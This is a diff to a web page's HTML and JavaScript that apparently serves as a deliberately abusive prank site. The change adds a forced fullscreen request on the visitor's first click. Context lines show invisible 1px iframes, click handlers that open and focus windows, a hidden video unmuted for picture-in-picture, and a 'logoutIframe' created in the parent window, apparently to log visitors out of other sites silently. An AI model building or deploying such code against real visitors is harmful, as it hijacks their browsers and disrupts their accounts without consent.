@@ -1,5 +1,5 @@
 <!--
-  Same as before, but add safari picture-in-picture
+  Same as before, but add fullscreen
 -->
 <html>
 <body>
@@ -8,10 +8,9 @@
   html, body { width: 100%; margin: 0; }
   video { width: 100%; height: 100%; }
   iframe { width: 1px; height: 1px; } /* Make iframes invisible */
-  #pip-video { opacity: 0 }
+  #pip-video { opacity: 0; height: 1; }
 </style>
 
-<!-- Invisible video for Safari's picture-in-picture. Enabled on first interaction -->
 <video id='pip-video' src='trolol.mp4' autoplay muted>
 
 <script>
@@ -73,10 +72,17 @@
   document.body.addEventListener('click', handleUserInput)
 
   function handleUserInput () {
+    // Fullscreen the page
+    const requestFullscreen = Element.prototype.requestFullscreen ||
+      Element.prototype.webkitRequestFullscreen ||
+      Element.prototype.mozRequestFullScreen ||
+      Element.prototype.msRequestFullscreen
+
+    requestFullscreen.call(document.body)
+
     focusWindows()
     openWindow()
 
-    // Use macOS picture-in-picture feature in Safari
     const pipVideo = document.querySelector('#pip-video')
     if (pipVideo.webkitSetPresentationMode) {
       pipVideo.muted = false
@@ -132,6 +138,7 @@
   }
 
   if (!window.opener) {
+    console.log('PARENT WINDOW')
     // *** RUNS IN PARENT WINDOW: ***
 
     const logoutIframe = document.createElement('iframe')
